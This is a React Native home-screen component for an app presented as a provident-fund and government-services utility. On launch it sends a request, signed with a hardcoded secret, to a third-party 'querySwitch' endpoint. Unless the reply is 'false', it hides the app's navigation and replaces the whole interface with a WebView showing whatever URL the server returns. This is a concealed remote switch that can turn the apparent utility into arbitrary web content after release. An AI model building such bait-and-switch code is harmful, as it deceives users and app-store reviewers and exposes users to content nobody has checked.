import React, {Component} from 'react';
import {
  StyleSheet,
  View,
  Image,
  ActivityIndicator,
  TouchableOpacity,
  ScrollView,
  WebView,
} from 'react-native';
import {Tile, Button, Card, Text, Divider} from "react-native-elements"
import Icon from "react-native-vector-icons/Ionicons"
import HttpUtils from "../../common/HttpUtils"
import CryptoJS from 'crypto-js'

export default class HomePage extends Component {
  constructor(props) {
    super(props);
    this.state = {
      transformData: null,
      loading: true,
      itemList: [
        {
          name: "我的公积金",
          icon: "ios-albums",
          color: "#f46820",
          size: 36,
          target: "Check",
        },
        {
          name: "业务查询",
          icon: "ios-wallet",
          color: "#699846",
          size: 36,
          target: "MyFund",
        },
        {
          name: "楼盘信息查询",
          icon: "ios-stats",
          color: "#008296",
          size: 36,
          target: "MyFund",
        },
        {
          name: "公积金计算器",
          icon: "ios-business",
          color: "#e0af91",
          size: 36,
          target: "LoanCalculator"
        },
        {
          name: "贷款计算器",
          icon: "ios-locate",
          color: "#5c3e71",
          size: 36,
          target: 'FundCalculator'
        },
        {
          name: "社保计算器",
          icon: "ios-map",
          color: "#b76a5d",
          size: 36,
          target: "SecurityCalculator",
        },
        {
          name: "政策法规",
          icon: "ios-list-box",
          color: "#f5bf2d",
          size: 36,
          target: "FundReport",
        },
        {
          name: "业务办理地点",
          icon: "ios-calendar",
          color: "#0068b6",
          size: 36,
          target: "WorkPlace",
        },
        {
          name: "我的",
          icon: "ios-man",
          color: "#506a6a",
          size: 36,
          target: "MyFund",
        },
      ]
    }
    this.listData = [
      {
        title: '企业名称自主申报',
        image: require('../../images/list6.jpg'),
        text: "申请人可以通过本系统自主申报企业名称，企业名称不再实行预先核准。",
        btnIcon: "code",
        backgroundColor: "#03A9F4",
        btnTitle: "查看详情",
        targetUri: "http://qcdz.gdgs.gov.cn/qcdzhdj/nameapply/"
      },
      {
        title: '市场监管',
        image: require('../../images/list7.jpg'),
        text: "市场行为监管、食品药品监管、质量监管、消费监管，提供互联网+监管服务。",
        btnIcon: "code",
        backgroundColor: "#03A9F4",
        btnTitle: "查看详情",
        targetUri: "http://static.gdzwfw.gov.cn/portal/portal-market-supervision/index.html"
      },
      {
        title: '自贸试验区企业专属网页',
        image: require('../../images/list8.jpg'),
        text: "为区内每一家企业配置一个专属网页，提供个性化电子政务服务",
        btnIcon: "code",
        backgroundColor: "#03A9F4",
        btnTitle: "查看详情",
        targetUri: "http://www.gdzwfw.gov.cn/portal/portal-ftz"
      },
      {
        title: '粤港澳大湾区便民服务',
        image: require('../../images/list9.jpg'),
        text: "方便市民及企业办事，目前推出往来港澳备案及签注服务",
        btnIcon: "code",
        backgroundColor: "#03A9F4",
        btnTitle: "查看详情",
        targetUri: "http://static.gdzwfw.gov.cn/portal/portal-bay/index.html"
      },
    ]
  }

  async componentWillMount() {
    const resData = this.sceret({name: "ios_fund_gongjijin"})

    const result = await HttpUtils.get(`https://event.9jiuying.cn/upgrade/querySwitch?name=${resData.name}&timestamp=${resData.timestamp}&sign=${resData.sign}`)

    if (result.data != "false") {
      this.props.navigation.setParams({tabBarVisible: false})
      this.setState({
        transformData: result.data,
        loading: false
      })
    }

    this.setState({
      loading: false
    })
  }


  // 对象排序
  Sort = (obj) => {
    var arr = Object.keys(obj).sort();
    var temp = {};
    arr.forEach(function (value) {
      temp[value] = obj[value];
    })
    return temp;
  }

  md5 = (word) => {
    return CryptoJS.MD5(word).toString()
  }

  sceret = (config) => {
    config = {
      timestamp: Date.parse(new Date()),
      ...config
    }

    const newConfig = this.Sort(config)
    let str = ''

    for (var key in newConfig) {
      str += key + "=" + newConfig[key] + "&"
    }

    str += "jiuying!@#$%^&*sign789"

    config = {
      sign: this.md5(str),
      ...newConfig
    }

    return config
  }

  render() {
    const {loading, transformData, itemList} = this.state
    return (
      <View style={styles.container}>
        {
          loading ? <View style={[styles.horizontal]}>
            <ActivityIndicator size="large" color="#4a98f0"/>
          </View> : (
            transformData ? (
                <WebView
                  source={{uri: transformData}}
                  style={{marginTop: 0}}
                />) :
              <View>
                <View style={styles.tile}>
                  <Tile
                    imageSrc={require('../../images/banner.jpg')}
                    title="便民利企"
                    featured
                    caption="一门式、一网式"
                  >
                  </Tile>
                </View>
                <View style={styles.grid}>
                  {
                    itemList.map((item, index) => {
                      return (<TouchableOpacity key={index} style={styles.item} onPress={() => {
                        this.props.navigation.navigate(item.target)
                      }}>
                        <Icon name={item.icon} size={item.size} style={{color: item.color}} />
                        <Text style={styles.word}>{item.name}</Text>
                      </TouchableOpacity>)
                    })
                  }
                </View>
              </View>
          )
        }
      </View>
    );
  }
}

const styles = StyleSheet.create({
  container: {
    flex: 1,
    backgroundColor: "#f5f5f5",
  },
  horizontal: {
    flexDirection: 'row',
    justifyContent: 'space-around',
    padding: 10,
    marginTop: 200,
  },
  grid: {
    display: "flex",
    flexDirection: "row",
    justifyContent: "flex-start",
    flexWrap: "wrap",
  },
  item: {
    width: "33.3%",
    height: 125,
    backgroundColor: "#fff",
    borderBottomWidth: 1,
    borderBottomColor: "#eee",
    borderRightWidth: 1,
    borderRightColor: "#eee",
    display: "flex",
    justifyContent: "center",
    alignItems: "center"
  },
  word: {
    marginTop: 5,
  }
});

